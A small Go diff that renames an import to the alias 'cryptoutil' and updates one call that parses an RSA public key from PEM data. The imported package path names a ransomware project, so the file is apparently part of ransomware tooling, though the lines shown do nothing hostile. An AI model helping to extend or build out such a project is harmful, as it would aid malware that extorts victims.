@@ -4,7 +4,7 @@ import (
     "fmt"
     "io/ioutil"
 
-    "github.com/sug0/sr-ransomware/go/crypto/util"
+    cryptoutil "github.com/sug0/sr-ransomware/go/crypto/util"
 )
 
 func main() {
@@ -12,7 +12,7 @@ func main() {
     if err != nil {
         panic(err)
     }
-    key, err := util.ParsePEMPublicKeyRSA(data)
+    key, err := cryptoutil.ParsePEMPublicKeyRSA(data)
     if err != nil {
         panic(err)
     }
